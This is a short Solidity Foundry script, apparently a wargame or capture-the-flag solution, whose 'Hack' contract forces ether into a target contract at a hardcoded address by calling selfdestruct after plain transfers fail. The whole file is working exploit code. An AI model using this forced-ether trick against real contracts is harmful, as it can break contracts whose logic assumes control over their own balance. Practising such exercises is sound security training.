// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Hack {
  function hack(address payable target) public payable {
    (bool success, ) = target.call{value: msg.value}("");
    console.log("Success of call is %s", success); // Fails

    bool callSuccess = target.send(msg.value);
    console.log("Success of send is %s", callSuccess); // Fails

    selfdestruct(target); // Send all ETH on contract destruction
  }
}

contract Solve is Script, Test {
  address payable target = payable(0x530A7ac136875b460B6a1c3F4785a939302B00AE);

  function run() public {
    vm.startBroadcast();

    Hack h = new Hack();
    h.hack{value: 0.0001 ether}(target);
    console.log("Balance of target after attack is %s", address(target).balance);

    vm.stopBroadcast();
  }
}
